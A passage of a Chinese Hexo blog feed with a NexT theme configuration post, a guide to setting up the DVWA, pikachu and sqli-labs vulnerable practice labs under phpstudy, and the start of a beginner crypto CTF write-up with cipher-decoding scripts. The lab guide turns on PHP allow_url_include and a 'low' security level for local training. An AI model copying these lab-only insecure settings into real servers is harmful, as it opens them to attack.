class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Canvas-nest</span></span><br><span class="line"><span class="attr">canvas_nest:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># three_waves</span></span><br><span class="line"><span class="attr">three_waves:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># canvas_lines</span></span><br><span class="line"><span class="attr">canvas_lines:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># canvas_sphere</span></span><br><span class="line"><span class="attr">canvas_sphere:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><h2 id="添加打赏功能"><a href="#添加打赏功能" class="headerlink" title="添加打赏功能"></a>添加打赏功能</h2><p><strong>主题配置文件</strong>，搜索reward关键词，添加打赏的配置信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Reward</span><br><span class="line"># If true, reward would be displayed in every article by default.</span><br><span class="line"># And you can show or hide one article specially through add page variable &#96;reward: true&#x2F;false&#96;.</span><br><span class="line">reward:</span><br><span class="line">  enable: true  &#x2F;&#x2F;默认是false，改为true</span><br><span class="line">  comment: 您的支持是对我最大的鼓励</span><br><span class="line">  wechatpay: &#x2F;images&#x2F;wechatpay.jpg  #图片链接或图片相对路径,当然也可以是绝对路径</span><br><span class="line">  alipay: &#x2F;images&#x2F;alipay.jpg      #同上</span><br></pre></td></tr></table></figure><h2 id="开启版权声明"><a href="#开启版权声明" class="headerlink" title="开启版权声明"></a>开启版权声明</h2><p>打开<strong>主题配置文件</strong>,搜索关键字 post_copyright </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">post_copyright:</span><br><span class="line">  enable: true  &#x2F;&#x2F;默认为false</span><br><span class="line">  license: CC BY-NC-SA 3.0</span><br><span class="line">  license_url: https:&#x2F;&#x2F;creativecommons.org&#x2F;licenses&#x2F;by-nc-sa&#x2F;3.0&#x2F;</span><br></pre></td></tr></table></figure><h2 id="分页问题"><a href="#分页问题" class="headerlink" title="分页问题"></a>分页问题</h2><p>网页往下翻的时候发现一个奇奇怪怪的东西</p><p><img src="Snipaste_2020-04-08_13-41-26.png" alt="Snipaste_2020-04-08_13-41-26"></p><p>这能忍???</p><p>找到<code>themes\next\layout\_partials\pagination.swig</code></p><p>修改代码为</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> page.prev or page.next %&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"pagination"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    </span><span class="template-variable">&#123;&#123;</span></span><br><span class="line"><span class="template-variable">      paginator(&#123;</span></span><br><span class="line"><span class="template-variable">        prev_text: '&lt;',</span></span><br><span class="line"><span class="template-variable">        next_text: '&gt;',</span></span><br><span class="line"><span class="template-variable">        mid_size: 1</span></span><br><span class="line"><span class="template-variable">      &#125;)</span></span><br><span class="line"><span class="template-variable">    &#125;&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span></span><br></pre></td></tr></table></figure><p>然后就正常了</p><p><img src="Snipaste_2020-04-08_13-45-49.png" alt="Snipaste_2020-04-08_13-45-49"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;next主题配置&quot;&gt;&lt;a href=&quot;#next主题配置&quot; class=&quot;headerlink&quot; title=&quot;next主题配置&quot;&gt;&lt;/a&gt;next主题配置&lt;/h1&gt;&lt;h2 id=&quot;Scheme&quot;&gt;&lt;a href=&quot;#Scheme&quot; class=&quot;headerli
      
    
    </summary>
    
    
      <category term="blog" scheme="https://mercer5.github.io/categories/blog/"/>
    
    
      <category term="blog" scheme="https://mercer5.github.io/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>学习环境搭建</title>
    <link href="https://mercer5.github.io/2020/04/08/%E5%AD%A6%E4%B9%A0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://mercer5.github.io/2020/04/08/%E5%AD%A6%E4%B9%A0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2020-04-08T05:33:44.000Z</published>
    <updated>2020-08-24T15:30:09.837Z</updated>
    
    <content type="html"><![CDATA[<h1 id="学习搭建环境"><a href="#学习搭建环境" class="headerlink" title="学习搭建环境"></a>学习搭建环境</h1><hr><p>最近想学一下安全的一些基本操作,所以搭了几个环境</p><p>在这里记录一下搭建的过程</p><p>尽量详细&gt;&lt;</p><hr><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><ol><li><p>下载phpstudy</p></li><li><p>下载dvwa源码: <a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a></p></li><li><p>下载pikachu源码: <a href="https://github.com/zhuifengshaonianhanlu/pikachu" target="_blank" rel="noopener">https://github.com/zhuifengshaonianhanlu/pikachu</a></p></li><li><p>下载sqli-labs源码: <a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p></li><li><p>安装好phpstudy后,开启服务</p><p><img src="Snipaste_2020-04-07_18-39-55.png" alt="Snipaste_2020-04-07_18-39-55"></p><p>变成这样</p><p><img src="Snipaste_2020-04-07_18-40-23.png" alt="Snipaste_2020-04-07_18-40-23"></p></li><li><p>把下载好的源码解压并拖到拖到phpstudy安装目录下的www中</p></li></ol><h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><h3 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h3><ol><li>修改<code>DVWA-master/config/config.inc.php.dist</code>的文件名为<code>config.inc.php</code>,并用记事本打开,修改数据库密码为<code>root</code></li></ol><p><img src="Snipaste_2020-04-07_18-46-00.png" alt="Snipaste_2020-04-07_18-46-00"></p><ol start="2"><li><p><code>$_DVWA[ &#39;default_security_level&#39; ] = &#39;low&#39;;</code>同一个文件,修改以下默认开启的难度</p></li><li><p>在浏览器输入<code>http://127.0.0.1/DVWA-master/setup.php</code>,单机创建或重置数据库</p><p><img src="Snipaste_2020-04-07_18-48-40.png" alt="Snipaste_2020-04-07_18-48-40"></p><p>​  <img src="Snipaste_2020-04-07_18-48-55.png" alt="Snipaste_2020-04-07_18-48-55"></p></li><li><p>进入登陆界面,输入默认用户名:admin,密码:password,ojbk</p></li><li><p>但是在第三步,一片红红火火恍恍惚惚的,让人有些害怕,所以搞一下</p></li></ol><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ol><li><p>reCAPTCHA key：<strong>Missing</strong></p><p><code>DVWA-master/config/config.inc.php</code>文件夹中</p><p>找到下述文段,复制粘贴</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_DVWA[ <span class="string">'recaptcha_public_key'</span> ]  = <span class="string">'6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg'</span><span class="comment">;</span></span><br><span class="line">$_DVWA[ <span class="string">'recaptcha_private_key'</span> ] = <span class="string">'6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ'</span><span class="comment">;</span></span><br></pre></td></tr></table></figure></li><li><p>PHP function allow_url_include: <strong>Disabled</strong></p><p>网上找到的方法是</p><p><code>DVWA-master/php.ini</code>中,把<code>allow_url_include</code> 设置成<code>on</code></p><p>然后我发现这个已经是on了,那么是哪里错了呢?</p><p>然后就发现了这么一个好东西</p><p><img src="Snipaste_2020-04-08_14-40-35.png" alt="Snipaste_2020-04-08_14-40-35"></p><p>这个可以直接修改<code>phpstudy_pro\Extensions\php</code>里面的配置</p><p>所以这个也改一下,重启phpstudy,ojbk</p><p><strong>注意!!! 修改的是你这个网站所用的配置文件,由于下一个环境的搭建,我把切换成了5.2.17</strong></p></li><li><p>进入SQL Injection页面,报错……</p><p><strong>Parse error</strong>: syntax error, unexpected ‘[‘ in <strong>D:\phpstudy_pro\WWW\DVWA-master\vulnerabilities\sqli_blind\index.php</strong> on line <strong>65</strong></p><p>找到该文件,修改</p><p><code>$num  = mysqli_fetch_row( $result )[0];</code>–&gt;<code>$num  = mysqli_fetch_row( $result );</code></p></li><li><p>PHP function magic_quotes_gpc: <strong>Enabled</strong></p><p>找不到解决办法&gt;&lt;</p><p>网上找到都没用跪了: (</p></li></ol><p>做个小小的补充</p><ul><li><p>难度默认是impossible,记得去<code>DVWA security</code>改<strong>(经过修改后默认是low了)</strong></p><p><img src="Snipaste_2020-04-08_13-15-56.png" alt="Snipaste_2020-04-08_13-15-56"></p></li></ul><h2 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h2><ol><li><p>用笔记本打开<code>pikachu-master\inc\config.inc.php</code>,修改数据库密码为本机的数据库密码</p><p>如果是<code>root</code>就不用改了</p><p><img src="Snipaste_2020-04-07_19-09-19.png" alt="Snipaste_2020-04-07_19-09-19"></p><p>同理修改一下<code>pikachu-master\pkxss\inc\config.inc.php</code></p></li><li><p>访问<code>http://localhost/pikachu-master/</code></p><p><img src="Snipaste_2020-04-07_19-15-33.png" alt="Snipaste_2020-04-07_19-15-33"></p></li><li><p>ojbk</p></li></ol><h2 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h2><ol><li><p>打开<code>sqli-labs-master\sql-connections\db-creds.inc</code>文件，将$dbpass参数值修改为root</p><p><img src="Snipaste_2020-04-07_20-19-37.png" alt="Snipaste_2020-04-07_20-19-37"></p></li><li><p>进入<code>http://127.0.0.1/sqli-labs-master/</code>,点击Setup/reset Database for labs</p></li><li><p>但是报错了</p><p><img src="Snipaste_2020-04-07_20-50-54.png" alt="Snipaste_2020-04-07_20-50-54"></p><p>出现这个问题是因为从PHP5.0开始mysql_connect()就不推荐使用了，到PHP7.0就直接被废弃了，如果PHP为7.0及以上版本的话用mysqli_connect()代替</p></li><li><p>所以到phpstudy改一下</p><p><img src="Snipaste_2020-04-07_20-40-37.png" alt="Snipaste_2020-04-07_20-40-37"></p><p><img src="Snipaste_2020-04-07_20-40-00.png" alt="Snipaste_2020-04-07_20-40-00"></p></li><li><p>重新Setup/reset Database for labs一下,出现以下界面</p><p><img src="Snipaste_2020-04-07_20-41-10.png" alt="Snipaste_2020-04-07_20-41-10"></p></li></ol><h2 id="站点目录"><a href="#站点目录" class="headerlink" title="站点目录"></a>站点目录</h2><p>虽然这样之后就可以用了</p><p><code>http://localhost/DVWA-master</code>进入DVWA</p><p><code>http://localhost/pikachu-master/</code>进入pikachu</p><p><code>http://localhost/sqli-labs-master/</code>进入sqli-labs</p><p>但是,每次输入那么多字,烦都烦死了,所以有没有什么方便的方法,搞个站点目录,直接点击进入呢?</p><p>从图中我们发现</p><p><img src="Snipaste_2020-04-07_19-26-46.png" alt="Snipaste_2020-04-07_19-26-46"></p><p>网站的首页是index.php或者index.html</p><p>点开www目录,确实有index.html文件</p><p>所以我们把该文件编辑一下</p><p><del>自己改写的辣鸡代码,就动了以下body和排版,大家可以自己修改一下(跪)</del></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>站点创建成功-phpstudy for windows<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"keywords"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"renderer"</span> <span class="attr">content</span>=<span class="string">"webkit"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge,chrome=1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1, maximum-scale=1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"apple-mobile-web-app-status-bar-style"</span> <span class="attr">content</span>=<span class="string">"black"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"apple-mobile-web-app-capable"</span> <span class="attr">content</span>=<span class="string">"yes"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"format-detection"</span> <span class="attr">content</span>=<span class="string">"telephone=no"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"pragma"</span> <span class="attr">CONTENT</span>=<span class="string">"no-cache"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"Cache-Control"</span> <span class="attr">CONTENT</span>=<span class="string">"no-store, must-revalidate"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"expires"</span> <span class="attr">CONTENT</span>=<span class="string">"Wed, 26 Feb 1997 08:21:57 GMT"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"expires"</span> <span class="attr">CONTENT</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    body &#123;</span><br><span class="line">      font: 16px arial, 'Microsoft Yahei', 'Hiragino Sans GB', sans-serif;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h1 &#123;</span><br><span class="line">      margin: 0;</span><br><span class="line"><span class="css">      <span class="selector-tag">color</span>: <span class="selector-id">#3a87ad</span>;</span></span><br><span class="line">      font-size: 26px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    <span class="selector-class">.content</span> &#123;</span></span><br><span class="line">      width: 45%;</span><br><span class="line">      margin: 0 auto;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    <span class="selector-class">.content</span>&gt;<span class="selector-tag">div</span> &#123;</span></span><br><span class="line">      margin-top: 200px;</span><br><span class="line">      padding: 20px;</span><br><span class="line"><span class="css">      <span class="selector-tag">background</span>: <span class="selector-id">#d9edf7</span>;</span></span><br><span class="line">      border-radius: 12px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    <span class="selector-class">.content</span> <span class="selector-tag">dl</span> &#123;</span></span><br><span class="line"><span class="css">      <span class="selector-tag">color</span>: <span class="selector-id">#2d6a88</span>;</span></span><br><span class="line">      line-height: 40px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    <span class="selector-class">.content</span> <span class="selector-tag">div</span> <span class="selector-tag">div</span> &#123;</span></span><br><span class="line">      padding-bottom: 20px;</span><br><span class="line">      text-align: center;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>站点创建成功<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dt</span>&gt;</span>目录说明:<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"./DVWA-master/"</span>&gt;</span>DVWA<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"./pikachu-master/"</span>&gt;</span>pikachu<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"./sqli-labs-master/"</span>&gt;</span>sqli-labs<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>结果图片</p><p>(test是我个人的网站,不用管)</p><p>(sqli-labs是后加的,所以图上没有)</p><p>(虽然不一样,但是上面的代码是可以直接用的,我已经修改过了)</p><p><img src="Snipaste_2020-04-07_19-33-16.png" alt="Snipaste_2020-04-07_19-33-16"></p><p>那么之后就可以直接点击进入了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;学习搭建环境&quot;&gt;&lt;a href=&quot;#学习搭建环境&quot; class=&quot;headerlink&quot; title=&quot;学习搭建环境&quot;&gt;&lt;/a&gt;学习搭建环境&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;最近想学一下安全的一些基本操作,所以搭了几个环境&lt;/p&gt;
&lt;p&gt;在这里记录一下搭建的过程&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="安全" scheme="https://mercer5.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全" scheme="https://mercer5.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-crypto-新手练习区</title>
    <link href="https://mercer5.github.io/2020/04/04/%C2%96%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-crypto-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/"/>
    <id>https://mercer5.github.io/2020/04/04/%C2%96%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-crypto-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/</id>
    <published>2020-04-04T15:08:21.000Z</published>
    <updated>2020-08-24T15:30:09.809Z</updated>
    
    <content type="html"><![CDATA[<h1 id="攻防世界-crypto-新手练习区"><a href="#攻防世界-crypto-新手练习区" class="headerlink" title="攻防世界-crypto-新手练习区"></a>攻防世界-crypto-新手练习区</h1><h2 id="1-base64"><a href="#1-base64" class="headerlink" title="1. base64"></a>1. base64</h2><p>在线解密,或是自己写脚本都行</p><h2 id="2-Caesar"><a href="#2-Caesar" class="headerlink" title="2. Caesar"></a>2. Caesar</h2><p>同上</p><h2 id="3-Morse"><a href="#3-Morse" class="headerlink" title="3. Morse"></a>3. Morse</h2><p>同上</p><h2 id="4-混合编码"><a href="#4-混合编码" class="headerlink" title="4. 混合编码"></a>4. 混合编码</h2><ol><li>base64</li><li>html实体编码</li><li>base64</li><li>ascii</li></ol><h2 id="5-不仅仅是Morse"><a href="#5-不仅仅是Morse" class="headerlink" title="5. 不仅仅是Morse"></a>5. 不仅仅是Morse</h2><ol><li><p>morese解密</p><p>得到一串奇奇怪怪的东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MAY_BE_HAVE_ANOTHER_DECODEHHHHAAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA</span><br></pre></td></tr></table></figure></li><li><p>后面的AB的长度为170</p><ul><li>5的倍数</li><li>只有两个字母</li><li>2^5^为32,可以很方便的表示26个字母</li><li>所以假设0-25,分别对应a-z</li></ul></li><li><p>尝试解密看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#分割替换</span></span><br><span class="line">s=<span class="string">"AAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA"</span></span><br><span class="line">s=s.replace(<span class="string">"A"</span>,<span class="string">"0"</span>)</span><br><span class="line">s=s.replace(<span class="string">"B"</span>,<span class="string">"1"</span>)</span><br><span class="line">lst=[]</span><br><span class="line"><span class="keyword">while</span>(s):</span><br><span class="line">    lst.append(s[:<span class="number">5</span>])</span><br><span class="line">    s=s[<span class="number">5</span>:]</span><br><span class="line">print(lst)</span><br><span class="line"><span class="comment">#生成字典</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">b=string.ascii_lowercase</span><br><span class="line">l1=[]</span><br><span class="line">l2=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    l1.append(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    l2.append(i)</span><br><span class="line">dic=dict(zip(l2,l1))</span><br><span class="line">print(dic)</span><br><span class="line"><span class="comment">#flag</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    num=int(i,<span class="number">2</span>)</span><br><span class="line">    print(dic.get(num),end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure></li></ol><h2 id="6-幂数加密"><a href="#6-幂数加密" class="headerlink" title="6. 幂数加密"></a>6. 幂数加密</h2>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#字母数字对应表生成</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">l1=[]</span><br><span class="line">l2=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">    l1.append(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string.ascii_uppercase:</span><br><span class="line">    l2.append(i)</span><br><span class="line">dic=dict(zip(l1,l2))</span><br><span class="line">print(dic)</span><br><span class="line"><span class="comment">#字符串处理</span></span><br><span class="line">a=<span class="string">"8842101220480224404014224202480122"</span></span><br><span class="line">lst=a.split(<span class="string">"0"</span>)</span><br><span class="line">lst=[eval(x) <span class="keyword">for</span> x <span class="keyword">in</span> lst]</span><br><span class="line">lst1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    sum=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(i):</span><br><span class="line">        sum+=i%<span class="number">10</span></span><br><span class="line">        i=i//<span class="number">10</span></span><br><span class="line">    lst1.append(sum)</span><br><span class="line">print(lst1)</span><br><span class="line"><span class="comment">#flag</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst1:</span><br><span class="line">    flag+=dic[i]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="6-easychallenge"><a href="#6-easychallenge" class="headerlink" title="6. easychallenge"></a>6. easychallenge</h2><p>给的是一个pyc文件,我就在在线python反编译网站上反编译了一下</p><p>得到python原码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode1</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = ord(i) ^ <span class="number">36</span></span><br><span class="line">        x = x + <span class="number">25</span></span><br><span class="line">        s += chr(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode2</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = ord(i) + <span class="number">36</span></span><br><span class="line">        x = x ^ <span class="number">36</span></span><br><span class="line">        s += chr(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode3</span><span class="params">(ans)</span>:</span></span><br><span class="line">    <span 